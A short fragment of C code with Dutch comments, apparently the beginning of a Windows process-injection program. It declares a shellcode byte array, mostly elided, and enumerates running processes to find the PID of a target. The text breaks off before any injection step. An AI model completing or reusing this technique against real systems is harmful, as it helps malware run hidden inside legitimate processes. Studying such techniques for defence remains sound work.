...
int main(int argc, char** argv) {
	...
	unsigned char shellcode[] =
		...
		"\x56\xff\xd5\x74\x65\x73\x74\x00\x74\x65\x73\x74\x00\x75"
	...
	// maakt een snapshot van bestaande processen
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	// enumeration van de processen
	Process32First(snapshot, &pe32);

	do {

		// als het matcht met het gewilde process wordt de PID opgehaald
